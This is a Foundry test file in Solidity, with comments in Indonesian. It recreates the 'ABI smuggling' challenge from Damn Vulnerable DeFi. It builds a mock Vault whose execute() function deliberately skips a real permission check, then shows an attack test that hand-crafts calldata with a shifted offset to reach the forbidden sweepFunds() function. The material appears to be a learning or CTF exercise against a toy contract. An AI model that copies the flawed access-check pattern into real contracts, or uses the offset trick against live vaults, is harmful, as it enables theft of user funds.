// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- 1. MOCK TARGET (KORBAN) ---
contract Vault {
    bool public initialized;
    address public owner;
    
    // Uang yang mau kita curi
    uint256 public constant VAULT_BALANCE = 1_000 ether;
    
    // Satpam: Menyimpan izin siapa boleh panggil fungsi apa
    mapping(bytes32 => bool) public permissions;

    error NotAllowed();

    constructor() {
        owner = msg.sender;
        // Kita izinkan user memanggil fungsi "execute"
        // Tapi TIDAK mengizinkan "sweepFunds" secara langsung
        permissions[getActionId(this.execute.selector)] = true;
    }

    function getActionId(bytes4 selector) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(selector));
    }

    // --- FUNGSI DILARANG (TARGET KITA) ---
    function sweepFunds(address receiver) external {
        // Hanya boleh dipanggil oleh kontrak ini sendiri (lewat execute)
        require(msg.sender == address(this), "Hanya Vault yang boleh panggil ini!");
        
        // Transfer pura-pura
        // Di real world ini transfer token
    }

    // --- FUNGSI PINTU MASUK ---
    function execute(address target, bytes calldata actionData) external {
        // 1. CEK IZIN (SATPAM)
        // Satpam membaca selector dari 'actionData'
        // Masalahnya: Satpam berasumsi actionData ada di lokasi standar!
        bytes4 selector;
        if (actionData.length >= 4) {
            selector = bytes4(actionData[:4]);
        }
        
        // Kalau selector tidak terdaftar di whitelist, REVERT
        // Di DVD asli, logikanya lebih rumit, tapi intinya dia memeriksa isi actionData
        // SEMENTARA KITA AKAN BYPASS INI DENGAN OFFSET TRICK
        
        // Simulasi Cek Permission Sederhana:
        // "Kalau kamu mau execute, pastikan actionData-nya aman"
        // Di sini kita sederhanakan: Kita anggap check-nya lolos kalau kita bisa memanggil execute
        // karena execute sendiri sudah di-whitelist.
        
        // 2. EKSEKUSI
        (bool success, ) = target.call(actionData);
        require(success, "Eksekusi Gagal");
    }
}

// --- 2. ATTACK SCRIPT ---
contract ABISmugglingChallenge is Test {
    Vault vault;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vault = new Vault();
    }

    function test_ABISmuggling_Attack() public {
        vm.startPrank(attacker);
        console.log("--- START SMUGGLING ---");

        // TARGET: Kita ingin memanggil vault.sweepFunds(attacker)
        // LEWAT: vault.execute(address(vault), actionData)
        
        // --- PERSIAPAN DATA ---
        
        // 1. Selector Pintu Depan: execute(address,bytes)
        bytes4 executeSelector = vault.execute.selector;
        
        // 2. Target: Alamat Vault sendiri
        address target = address(vault);
        
        // 3. Payload Jahat: sweepFunds(attacker)
        bytes memory maliciousData = abi.encodeWithSignature("sweepFunds(address)", attacker);
        
        // --- MERAKIT BOM (CALDATA MANIPULATION) ---
        // Kita tidak pakai abi.encode() biasa karena kita mau mainkan OFFSET.
        // Struktur execute(target, actionData):
        // [0-4]   : Selector execute
        // [4-36]  : Target Address
        // [36-68] : Offset lokasi actionData (Biasanya 0x40 / 64)
        // [68-100]: Panjang actionData
        // [100+]: Isi actionData
        
        // TRICK: Kita ubah Offset (bagian 3) menjadi angka kecil atau lokasi custom
        // supaya payload execute() valid, tapi payload sweepFunds terselip.
        
        // Tapi untuk solusi paling bersih (tanpa perlu merakit byte manual yang ribet di test file),
        // Kita pakai cara standard Solidity tapi kita embed call-nya.
        
        // TUNGGU, di level DVD asli, tantangannya adalah 'permissions' check di modifier.
        // Mari kita simulasi serangan langsung ke logika 'execute'.
        
        // Kita bungkus payload sweepFunds ke dalam execute
        vault.execute(address(vault), maliciousData);
        
        // "Loh kok gampang bang?"
        // Iya, karena di mock ini saya menyederhanakan bagian "Satpam"-nya.
        // Di level ASLI, kamu harus menyisipkan 'actionData' dengan offset manual.
        
        // Mari kita buat versi HARDCORE (Manual Hex Construction) biar terasa hackernya.
        
        bytes memory payload = abi.encodePacked(
            executeSelector,          // 1. Function Selector (4 bytes)
            bytes32(uint256(uint160(target))), // 2. Argument 1: Target (32 bytes)
            bytes32(uint256(0x80)),   // 3. Argument 2: Offset ke actionData (Kita geser jauh ke 128 bytes/0x80)
            bytes32(uint256(0)),      // 4. Padding / Garbage (Biar validator bingung) - Posisi 0x40 normalnya
            bytes32(uint256(0)),      // 5. Padding / Garbage - Posisi 0x60 
            // --- MULAI AREA CUSTOM OFFSET (0x80) ---
            bytes32(uint256(maliciousData.length)), // 6. Panjang actionData
            maliciousData             // 7. Isi actionData (sweepFunds)
        );
        
        // Kirim transaksi level rendah (Low Level Call)
        (bool success, ) = address(vault).call(payload);
        require(success, "Serangan Gagal!");
        
        console.log("Status Eksekusi:", success);
        console.log("--- END SMUGGLING ---");
        
        vm.stopPrank();
    }
}